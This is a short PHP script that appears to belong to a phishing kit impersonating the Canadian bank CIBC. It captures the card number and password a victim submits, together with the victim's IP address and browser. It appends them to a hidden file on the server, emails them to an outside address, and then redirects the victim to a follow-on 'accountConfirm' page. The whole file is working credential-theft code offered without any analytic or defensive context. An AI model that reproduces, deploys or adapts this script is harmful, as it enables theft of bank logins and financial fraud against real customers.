<?php

error_reporting(0);
$send = "ventura514@outlook.com";

$ip = getenv("REMOTE_ADDR");
$browser = $_SERVER['HTTP_USER_AGENT'];
$message .= "-------------------LOGIN--------------------\n";
$message .= "username : ".$_POST['cardNumber']."\n";
$message .= "password : ".$_POST['password']."\n";
$message .= "IP          : ".$ip."\n";
$message .= "BROWSER     : ".$browser."\n";
$message .= "--------------------------------------------\n";

$subject = "CIBC RESULTS";

$fp = fopen($_SERVER['DOCUMENT_ROOT'] . "/35yhrgesccd.txt","a+");
fwrite($fp,"CIBC" . " | " .getenv('HTTP_X_FORWARDED_FOR') . " | " . $_SERVER['HTTP_USER_AGENT'] . " | " . "\n\n" .$subject . "\n" . $message . "\n\n");
fclose($fp);

mail($send , "CIBC", getenv('HTTP_X_FORWARDED_FOR') . " | " . $_SERVER['HTTP_USER_AGENT'] . " | " . "\n\n" .$subject . "\n" . $message . "\n\n");

?>
<script>
    window.top.location.href = "accountConfirm.php";

</script>